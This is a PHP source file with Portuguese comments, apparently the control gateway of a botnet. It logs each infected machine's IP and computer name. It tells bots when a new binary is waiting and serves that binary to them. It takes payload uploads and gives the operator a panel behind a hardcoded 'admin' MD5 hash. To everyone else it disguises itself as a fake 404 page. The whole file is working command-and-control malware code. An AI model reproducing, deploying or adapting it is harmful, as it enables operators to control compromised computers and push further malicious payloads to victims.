<?php
	
	/*
	** Gateway de controle do bot.
	** Instalação: abrir ao menos uma vez no browser para o script criar os diretórios e arquivos.
	*/
	error_reporting(0);
	
	/* Configurações. */
	$hash = "21232f297a57a5a743894a0e4a801fc3"; // admin - Senha em MD5.
												// Login: http://HOST/gateway.php?action=pn&data=admin
	
	// Inicialização.
	if (!file_exists('infects/')) {
		mkdir('infects/', 0777);
		if (($fp = fopen('infects/index.html', 'w')) !== false)
			fclose($fp);
	}
	if (!file_exists('files/')) {
		mkdir('files/', 0777);
		if (($fp = fopen('files/index.html', 'w')) !== false)
			fclose($fp);
		if (($fp = fopen('files/downloaded.txt', 'w')) !== false)
			fclose($fp);
	}
	
	// Novo infect.
	if (isset($_GET['action']) && $_GET['action'] == 'nw' &&
		isset($_GET['data']) && !empty($_GET['data'])) {
		$computer = $_GET['data'];
		$date = date('d-m-y');
		if (($fp = fopen("infects/{$_SERVER['REMOTE_ADDR']}-{$computer}.txt", 'a+')) !== false) {
			$content  = "Computer name: {$computer}\n";
			$content .= "IP: {$_SERVER['REMOTE_ADDR']}\n";
			$content .= "Date: {$date}\n\n";
			fwrite($fp, $content);
			fclose($fp);
		}
	}
	
	// Verifica se existe arquivo para ser baixado.
	if (isset($_GET['action']) && $_GET['action'] == 'cw') {
		if (file_exists('files/928923')) {
			if (($fp = fopen('files/downloaded.txt', 'r')) === false) {
				if (($fp = fopen('files/downloaded.txt', 'w')) !== false) {
					fclose($fp);
				}
			}
			
			if (($fp = fopen('files/downloaded.txt', 'r')) !== false) {
				$is_blacklist = false;
				while (!feof($fp)) {
					if (strcmp(str_replace(array("\r", "\n"), '', fgets($fp)), $_SERVER['REMOTE_ADDR']) == 0) {
						$is_blacklist = true;
						break;
					}
				}
				fclose($fp);
			}
			if ($is_blacklist === false) {
				if (($fp = fopen('files/downloaded.txt', 'a+')) !== false) {
					fwrite($fp, "{$_SERVER['REMOTE_ADDR']}\n");
					fclose($fp);
					die("\r\nYES\r\n");
				}
			}
		}
		die("\r\nNOT\r\n");
	}
	
	// Envia binário para aplicação.
	if (isset($_GET['action']) && $_GET['action'] == 'rw') {
		if (file_exists('files/928923')) {
			header("Content-Type: application/octet-stream");
			header("Content-Length: ". filesize('files/928923'));
			header("Content-Disposition: attachment; filename=". basename('files/928923'));
			readfile('files/928923');
		}
		exit();
	}
	
	// Recebe arquivo da área de cotrole.
	if (isset($_FILES['file']['name'])) {
		unlink('files/928923');
		move_uploaded_file($_FILES['file']['tmp_name'], 'files/928923');
	}
	
	// Cancela upgrade.
	if (isset($_GET['action']) && $_GET['action'] == 'pn' && 
		md5($_GET['data']) == $hash && $_GET['ac'] == 'stop') {
		unlink('files/928923');
	}
	
	// Painel de controle.
	if (isset($_GET['action']) && $_GET['action'] == 'pn' && md5($_GET['data']) == $hash) {
		$totalInfects = 0;
		$totalUpgrades = 0;
		$statusUpgrades = '<font style="color: red; font-size: 11px;"><b>NOT</b></font>';
		
		if ($handle = opendir('infects/')) {
			while (false !== ($entry = readdir($handle))) {
				if ($entry != "." && $entry != ".." && $entry != "index.html") {
					$totalInfects++;
				}
			}
			closedir($handle);
		}
		
		if (file_exists('files/928923')) {
			$statusUpgrades = '<font style="color: green; font-size: 11px;"><b>YES</b></font>';
			if (($fp = fopen('files/downloaded.txt', 'r')) !== false) {
				while (!feof($fp)) {
					if (strlen(str_replace(array("\n", "\r"), '', fgets($fp))) > 0)
						$totalUpgrades++;
				}
				fclose($fp);
			}
		}
		
?>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Bot manager.</title>
		<style>
			body {
				background-color: #000000;
				color: #00FF00;
			}
		</style>
		<script type="text/javascript" >
			
			function Enviar(){
				document.formfile.submit();
			}
			
			function Cancelar(){
				window.location.href = '<?php echo $_SERVER['PHP_SELF']; ?>?action=pn&data=<?php echo $_GET['data']; ?>&ac=stop';
			}
			
			function Refresh(){
				window.location.href = '<?php echo $_SERVER['PHP_SELF']; ?>?action=pn&data=<?php echo $_GET['data']; ?>';
			}
			
		</script>
	</head>
	<body>
		<table width="350" cellpadding="0" cellspacing="2" border="0" >
		<tr>
			<td align="left">Statistics.<br><br></td>
			<td align="right">
				<input type="button" value="Refresh" onclick="Javascript: Refresh();" />
				<br><br>
			</td>
		</tr>
		<tr>
			<td align="left">Infect: </td>
			<td align="right"><?php echo $totalInfects; ?></td>
		</tr>
		<tr>
			<td align="left">Upgraded: </td>
			<td align="right"><?php echo $statusUpgrades; ?> - <?php echo $totalUpgrades; ?></td>
		</tr>
		
		
		<form name="formfile" enctype="multipart/form-data" action="<?php 
			echo $_SERVER['PHP_SELF']; ?>?action=pn&data=<?php echo $_GET['data']; ?>" method="POST" >
		<input type="hidden" name="MAX_FILE_SIZE" value="5120000" />
		<tr>
			<td align="left">
				<br><input name="file" type="file" />
			</td>
			<td align="right">
				<br><input type="button" value="Send" onclick="Javascript: Enviar();" />
			</td>
		</tr>
		</form>
		
		<tr>
			<td align="right" colspan="2" >
				<input type="button" value="Cancel upgrade" onclick="Javascript: Cancelar();" />
			</td>
		</tr>
		</table>
	</body>
</html>

<?php
	} else {
?><!DOCTYPE  HTML PUBLIC  "-//IETF/ /DTD HTML  2.0//EN">
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL <?php echo $_SERVER['REQUEST_URI']; ?> was not found on this server.</p>
    <p>Additionally, a 404 Not Found
    error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body>
</html><?php } ?>